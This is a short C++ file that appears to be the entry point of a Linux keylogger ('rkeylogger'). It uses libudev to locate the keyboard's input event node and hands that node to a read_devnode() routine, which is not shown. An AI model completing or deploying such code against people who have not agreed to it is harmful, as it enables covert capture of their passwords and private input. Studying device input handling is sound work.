#include <iostream>
#include <libudev.h>
#include <cstring>

#include "rkeylogger.h"

int main() {
    struct udev *udev = udev_new();
    if (!udev) {
        std::cerr << "[ ERROR ]: cannot use libudev.\n" << std::endl;
        return 1;
    }

    struct udev_enumerate *enumerate = udev_enumerate_new(udev);
    udev_enumerate_add_match_subsystem(enumerate, "input");
    udev_enumerate_add_match_property(enumerate, "ID_INPUT_KEYBOARD", "1");
    udev_enumerate_scan_devices(enumerate);

    struct udev_list_entry *devices = udev_enumerate_get_list_entry(enumerate);
    struct udev_list_entry *entry;

    udev_list_entry_foreach(entry, devices) {
        const char *path = udev_list_entry_get_name(entry);
        struct udev_device *dev = udev_device_new_from_syspath(udev, path);

        const char *devnode = udev_device_get_devnode(dev);
        if (devnode && strstr(devnode, "event")) {
            std::cout << "[ KEYBOARD_EVENT_PATH ]: " << devnode << std::endl;
            read_devnode(devnode);
            break;
        }

        udev_device_unref(dev);
    }

    udev_enumerate_unref(enumerate);
    udev_unref(udev);
    return 0;
}